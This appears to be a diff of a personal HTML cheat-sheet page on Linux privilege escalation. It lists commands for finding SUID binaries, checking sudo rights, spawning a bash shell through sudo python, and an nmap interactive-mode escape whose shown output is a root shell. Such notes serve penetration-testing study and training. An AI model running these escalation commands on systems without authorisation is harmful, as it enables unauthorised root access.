@@ -9,22 +9,30 @@
 <a href="https://payatu.com/guide-linux-privilege-escalation">https://payatu.com/guide-linux-privilege-escalation</a>&nbsp; <br/>
 <br/>
 <br/>
-<div style="text-align: left"><span style="font-family: roboto"><span style="font-size: 13pt">#</span></span></div><b>Exploiting vulnerable SUID executable to get root access</b>&nbsp; <div style="text-align: left"><span style="font-size: 13pt"><span style="font-family: roboto"> <br/>
-</span></span></div><span style="font-size: 13pt">find / -perm -u=s -type f 2&gt;/dev/null<div style="text-align: left"><span style="font-family: roboto"> – It prints the executables which have SUID bit set</span></div>&nbsp; <br/>
+<span style="font-size: 13pt"><span style="font-family: roboto"><div style="text-align: left">#</div></span></span><b>Exploiting vulnerable SUID executable to get root access</b>&nbsp; <span style="font-family: roboto"><span style="font-size: 13pt"><div style="text-align: left"> <br/>
+</div></span></span><span style="font-size: 13pt">find / -perm -u=s -type f 2&gt;/dev/null<span style="font-family: roboto"><div style="text-align: left"> – It prints the executables which have SUID bit set</div></span>&nbsp; <br/>
 <br/>
-</span><span style="font-size: 11pt">#<span style="font-family: roboto"><div style="text-align: left">Prints the commands which we are allowed to run as SUDO</div></span><b>&nbsp;</b></span><b><span style="font-size: 12pt">&nbsp;</span></b><span style="font-size: 12pt"><br/>
-</span><span style="font-size: 12pt">sudo -l<div style="text-align: left"><span style="font-family: roboto">  <br/>
-</span></div><div style="text-align: left"><span style="font-family: roboto"><br/>
-<br/>
-<br/>
+</span><span style="font-size: 11pt">#<div style="text-align: left"><span style="font-family: roboto">Prints the commands which we are allowed to run as SUDO</span></div><b>&nbsp;</b></span><b><span style="font-size: 12pt">&nbsp;</span></b><span style="font-size: 12pt"><br/>
+</span><span style="font-size: 12pt">sudo -l<span style="font-family: roboto"><div style="text-align: left">  <br/>
+</div></span><span style="font-family: roboto"><div style="text-align: left"><br/>
 <br/>
 <br/>
 <br/>
 <br/>
 <br/>
-</span></div></span><br/>
-#<span style="font-family: roboto"><div style="text-align: left"><span style="font-size: 12pt">spawns a shell if you sudo access via python</span></div></span><br/>
-<div style="text-align: left"><span style="font-family: roboto"><span style="font-size: 12pt"><br/>
-</span></span></div><div style="text-align: left"><span style="font-family: roboto"><span style="font-size: 12pt">sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’ – spawns a shell</span></span></div>&nbsp; <br/>
+<br/>
+<br/>
+</div></span></span><br/>
+#<span style="font-size: 12pt"><div style="text-align: left"><span style="font-family: roboto">spawns a shell if you sudo access via python</span></div></span><br/>
+<span style="font-size: 12pt"><span style="font-family: roboto"><div style="text-align: left"><br/>
+</div></span></span><span style="font-size: 12pt"><span style="font-family: roboto"><div style="text-align: left">sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’ – spawns a shell</div></span></span>&nbsp; <br/>
+<br/>
+#nmap goes to root if &nbsp;SUID is set <br/>
+nmap --interactive<br/>
+<span style="font-size: 12pt"><span style="font-family: Monaco"><div style="text-align: left">nmap&gt; !sh<br/>
+sh-3.2# whoami<br/>
+</div></span></span><span style="font-size: 12pt"><span style="font-family: Monaco"><div style="text-align: left">root</div></span></span>&nbsp; <br/>
+<br/>
+<br/>
 <br/>
 </body></html>
